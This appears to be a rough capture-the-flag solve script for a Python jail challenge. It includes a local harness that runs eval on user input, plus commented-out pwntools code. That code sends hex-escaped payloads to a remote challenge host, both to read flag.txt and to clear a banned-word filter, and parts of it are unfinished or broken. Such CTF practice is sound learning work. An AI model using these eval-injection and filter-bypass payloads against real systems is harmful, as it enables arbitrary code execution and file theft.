from pwn import p64
from pwn import *

# dir(__builtins__)[-51]('print(1)')
banned = ["hai"]
test = input()
eval(test)
print(banned)

# hexa = "\x70\x72\x69\x6e\x74\x28\x6f\x70\x65\x6e\x28\x27\x66\x6c\x61\x67\x2e\x74\x78\x74\x27\x29\x2e\x72\x65\x61\x64\x28\x29\x29"

# flag = ""
# for i in range(0, len(flag), 2):
#     flag += f"\x{hexa[i:i+2]}"
#     print(flag)

# print(hexa)
# import binascii

# payload = b"print(1)"
# payload = binascii.hexlify(payload).decode()
# flag = "\x70\x72\x69\x6e\x74\x28\x31\x29"

# for i in range(0, len(payload), 2):
#     flag += f"{payload[i:i+2]}"
#     print(flag)

# print(flag)

# import binascii

# host, port = "34.101.122.7", 10008

# conn = remote(host, port)

# conn.sendline(b"john")
# payload = b"exec('banned = []')"
# payload = b"print(1)"
# # payload = "0x" + binascii.hexlify(b"exec('banned = []')").decode()
# # # print(payload)
# # payload = p64(0x6578656328276261, endian="big")
# # payload += p64(0x6E6E6564203D205B, endian="big")
# # payload += p64(0x5D2729, endian="big")

# temp = ""
# for i in payload:
#     temp += hex(i)

# print(temp)

# conn.sendline(temp.replace("0x", "\\x").encode())

# print("Hai")
# print(payload)
# conn.interactive()
# print(payload)
